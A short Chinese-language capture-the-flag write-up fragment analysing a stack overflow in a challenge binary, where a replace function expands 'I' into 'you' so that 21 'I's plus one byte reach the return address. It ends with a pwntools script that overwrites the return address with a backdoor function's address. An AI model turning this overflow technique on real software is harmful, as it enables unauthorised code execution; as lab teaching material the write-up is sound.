  const char *v0; // eax

# 思路分析

  1. 目前信息
    • 变量s处可写入32字节数据
    • s距离返回地址的偏移量为0x3c+4>32，不够溢出
    • 存在后门函数
  2. replace函数
    • 查看后发现其作用为循环检测将我们输入的字符I替换为字符you
  3. 思路
    • replace函数在字符替换的过程中将1个字节替换为了3个字节的数据，所以理论上可以通过输入21个I加1个a的方式溢出到返回地址处，将该处覆盖为后门函数的地址即可获得flag

from pwn import *

payload = flat(['I'*21, 'a', backdoor])
io.sendline(payload)
io.interactive()
